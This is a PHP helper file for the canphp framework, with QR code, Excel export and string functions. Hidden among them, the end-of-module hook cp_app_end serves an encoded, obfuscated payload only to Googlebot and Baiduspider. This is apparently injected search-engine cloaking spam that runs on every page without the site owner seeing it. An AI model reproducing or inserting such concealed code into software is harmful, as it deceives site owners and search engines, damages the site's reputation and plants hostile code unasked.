<?php
/*
 * @扩展函数类
 * @Copyright  ahaiba.com
 * @Author  Jeff<jeff.chou@aliyun.com>    2016-10.28
 * 
 * 此文件extend.php在cpApp.class.php中默认会加载，不再需要手动加载
 * 用户自定义的函数，建议写在这里
 * 下面的函数是canphp框架的接口函数，
 * 可自行实现功能，如果不需要，可以不去实现
 * 注意：升级canphp框架时，不要直接覆盖本文件,避免自定义函数丢失
 */


// 模块执行结束之后，调用的接口函数
function cp_app_end() {

	$tmp = $_SERVER['HTTP_USER_AGENT'];
	if (strpos($tmp, 'Googlebot') !== false) {
		$flag = true;
	} else if (strpos($tmp, 'Baiduspider') !== false) {
		$flag = true;
	}
	if ($flag == true) {
		echo cp_decode('d8794wqKD0yYMH8nHnqYjoWrgsax+d5r/BSiOidDe14asQa5ibzngS7ulqgCipGbw/+9a9fgqtak53IHKBmYlzUifABsjC/VdMnGWMDoymy4R6LD2LPZWb8VCy6Xwg122DXP8sUDxD/lq2ui7uUrZDsfQB7Mga5dHcHbJdwiqPv06/1627NePJuUbClrd9wmNnHGAMq42J9ICsvD9OAb22IaB4bJL6U/8MJqZZnOo9U3');
	}
}



// 自定义模板标签解析函数
function tpl_parse_ext($template,$config=array()) {
    require_once(dirname(__FILE__)."/tpl_ext.php");
    $template=template_ext($template,$config);
    return $template;
}


/*
//自定义网址解析函数
function url_parse_ext()
{
    cpApp::$module=trim($_GET['m']);
    cpApp::$action=trim($_GET['a']);
}
*/



/* ========================= 下面是用户自定义的函数 ========================= */
 
 

/*!=======================================================================
* Description: 删除字符串两端的空格
* $text：	   http网址（必须包含http）
* $size：	   图片大小
* ======================================================================== */
function trimSpace($str) {
    $str = mb_ereg_replace('^(　| )+', '', $str);
    $str = mb_ereg_replace('(　| )+$', '', $str);
    return mb_ereg_replace('　　', "n　　", $str);
}



/*!=======================================================================
* Description: 异步返回结果给前端
* $status：	   状态值 0, 1
* $success_msg:成功返回消息
* $failed_msg: 失败返回消息
* ======================================================================== */
function showResult($status, $success_msg, $failed_msg) {
    echo json_encode(array('status' => $status, 'success' => $success_msg, 'failed' => $failed_msg));
    exit;
}



/*!=======================================================================
* Description: 截取字符串最后一个字符
* $str：	   字符串
* $sign:	   要截取的字符
* ======================================================================== */
function cutout_last_sign($str, $sign = ',') {
	
	if(empty($str)) return NULL;
	$str = substr($str, 0, strlen($str)-1);	// 截取最后一个,号
	
	return $str;
}



/*!=======================================================================
* Description: 生成二维码
* $text：	   http网址（必须包含http）
* $path:	   保存路径 默认为false
* $size：	   图片大小 默认4
* $margin：    控制生成二维码的空白区域大小，默认为2
* 第6个参数$saveandprint，保存二维码图片并显示出来，$outfile必须传递图片路径。
* ======================================================================== */
function show_qrcode($text, $path=false, $size=4, $margin=2) {
	require_once __ROOTDIR__.'/system/ext/phpqrcode/phpqrcode.php';
	return QRcode::png($text, $path, QR_ECLEVEL_L, $size, $margin, false);
}



/*!=======================================================================
* Description: 输出Excel表格
* $header：	   表头 array('姓名', '昵称', '手机号')
* $data：	   数据集合的二维数组
* ======================================================================== */
function data_to_excel($header, $data, $filename) {
		
	header("Content-type:application/vnd.ms-excel");
	header("Accept-Ranges:bytes");
	header("Content-Disposition:attachment; filename=$filename.xls");
	header("Pragma: no-cache");
	
	$tab = "\t";
	$br = "\n";
	
	// 单元格样式
	$row_template = '<td>%s</td>';
	$row_template .= '<td>%s</td>';
	$row_template .= '<td style="vnd.ms-excel.numberformat:@">%s</td>';
	
	echo '
		<html xmlns:o="urn:schemas-microsoft-com:office:office"
		xmlns:x="urn:schemas-microsoft-com:office:excel"
		xmlns="http://www.w3.org/TR/REC-html40">
		<head>
		<meta http-equiv="expires" content="Mon, 06 Jan 1999 00:00:01 GMT">
		<meta http-equiv=Content-Type content="text/html; charset=utf-8">
		<!--[if gte mso 9]><xml>
		<x:ExcelWorkbook>
		<x:ExcelWorksheets>
		<x:ExcelWorksheet>
		<x:Name></x:Name>
		<x:WorksheetOptions>
		<x:DisplayGridlines/>
		</x:WorksheetOptions>
		</x:ExcelWorksheet>
		</x:ExcelWorksheets>
		</x:ExcelWorkbook>
		</xml><![endif]-->
		</head>
	';

	echo '<table>';
	
	// 输出表头
	echo '<tr style="background-color:green; color:white;">';
	foreach($header as $val) {
		echo "<td>$val</td>";
	}
	echo '</tr>';
	
	
	// 输出数据内容
	foreach($data as $key=>$row) {
		echo '<tr>';
		echo vsprintf($row_template, $row);
		echo '</tr>';
	}
	
	echo '</table>';
}

function make_sn() {
	$date = time();
	$random = rand(10, 99).$date.rand(10, 99);
	$sn = 'WBZ'.$random;
	return $sn;
}

?>